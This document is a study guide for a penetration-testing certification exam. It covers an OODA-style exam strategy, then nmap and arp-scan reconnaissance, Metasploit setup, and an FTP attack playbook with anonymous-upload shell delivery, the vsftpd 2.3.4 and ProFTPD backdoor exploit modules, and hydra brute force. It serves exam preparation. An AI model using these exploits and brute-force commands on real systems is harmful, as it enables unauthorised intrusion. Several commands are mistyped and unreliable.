# Summary
This strategic guide rovides mandatory protocols for the exam's unique constraints and uses OODA-based troubleshooting loops to help follow the best practice opertaions and overcome common "stuck" points in reconnaissance, exploitation, and pivoting.

# Before the Biginning

This section provides a high-level OODA loop to guide the entire 48-hour examination.

- Observe (Observe the battlefield): This constitutes the initial 30 minutes.
    - Action: Read all 35 questions 1
    - Action: Read and comprehend the core table 1 (minimum pass mark) 
    - Action: Read and internalise the examination constraints (no internet access, dynamic Flags)
    
- Orient (Adjust mindset): This represents the most critical strategic step.
    - The exam is not a ‘pwn-all-machines’ CTF. It is a ‘document-all-findings’ audit.
    - The exam meticulous enumeration and documentation outweigh exploitation.

- Decide (Establish Engagement Rules): 
    - I shall follow a “problem-driven attack” model. These 35 issues form my map.
    - I shall adopt a “dual-brain strategy” and “flag submission protocol” as mandatory, inviolable rules.
    - I shall not become bogged down on a single exploit for more than 30 minutes. I shall pivot to alternative targets, gathering additional “assessment” score points, which (with a minimum threshold of 90%) hold greater value than exploitation (minimum threshold of 70%).

- Action (Execution):
    - Entering the second phase (tactical setup and reconnaissance) with this reinforced, resilient mindset.

| Domain                        | Weight | Key Skills                                                                                                                    | Minimum Score |
| ----------------------------- | ------ | ----------------------------------------------------------------------------------------------------------------------------- | ------------- |
| Assessment Methodologies      | 25%    | Host discovery (`nmap -sn`), port/service/OS identification(`nmap -sV -sC -O`), vulnerability identification (`searchsploit`) | 90%           |
| Host & Networking Auditing    | 25%    | System/user enumeration , credential dumping, file transfer                                                                   | 80%           |
| Host & Networking Penetration | 35%    | Exploitation (Metasploit Framework), Brute Force (hydra), Pivoting                                                            | 70%           |
| Web Application               | 15%    | Directory enumeration (gobuster), CMS scanning (wpscan), SQL injection, cross-site scripting                                  | 60%           |

# Tactical Deployment and Reconnaissance

## Metasploit Framework Initiation and Verification Workflow

The Metasploit database serves as the core strategic tool for managing operational cognitive load.

```
root@attack service postgresql start && msfconsole
msf6 > db status
msf6 > workspace -a lab
```

## Network and Service Reconnaissance

The objective at this stage is to construct a comprehensive ‘map’ of the network.

### Host Discovery

`root@attack nmap -sn <target_ip_range>`

### Service and Port Scanning

`root@attack nmap -sV -sC -O -p- <target_ip> -oX v_<target_ip>.xml`

### Import Nmap Results into Metasploit

```
msf6 > db_import v_<target_ip>.xml
msf6 > hosts
msf6 > setg RHOSTS <target_ip>
msf6 > setg RHOST <itarget_ip>
```

## The OODA Loop in the Reconnaissance Phase (Troubleshooting)

### Issue 1

- Orient (Positioning issue): `nmap -sn` scan shows zero hosts, or `nmap -sV` scan indicates all ports are “filtered”.
- Decide (Determine Diagnostic Action):
    1. Re-Orient (Tool Failure): $nmap -sn$ (ICMP Ping) is frequently blocked by firewalls. $nmap -sV$ (default SYN scan) may also be blocked.
    2. Re-Decide (Switch Tools):
- Action:
    1. Use `sudo arp-scan -I eth0 <RANGE>`. ARP operates at Layer 2 and is virtually unfiltered on the local subnet. This is the most reliable host discovery method.
    2. For port scanning, switch to a full TCP Connect scan: `nmap -sT -Pn`. -sT is noisier but more reliable against simple firewalls. -Pn skips (potentially failing) host discovery pings.
- Re-Orient (Self-Check): ‘Is my own machine configured correctly?’ Check `ip a` on Kali. Are you
on the correct VPN ($tun0$)? Are you scanning the correct subnet?

# Attack Playbook (Enumeration and Exploitation)

## Port 21: FTP

### Scan

`root@attack nmap -p 21 --script ftp-anon <target_ip>`

### Manual Enumeration

`root@attack ftp <target_ip>`   
(Use `anonymous` as username and empty password to login)

### MSF Enumeration

`msf6 > use auxiliary/scanner/ftp/anonymous`

### Exploitation

- If Nmap results indicate ‘Anonymous FTP login permitted’ with write access (WA WRITE). Proceed immediately to Payload delivery using `put shell.exe`.
- IF Banner = ‘vsftpd 2.3.4’

  `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor`
  
- IF Banner = ‘Pro-FTPD 1.3.3c’
  
    `msf6 > exploit/unix/ftp/proftpd_133c_backdoor`
  
- Brute Force:
  
    `root@attack hydra -L <user_file> -P <password_file> ftp://<target_ip>`

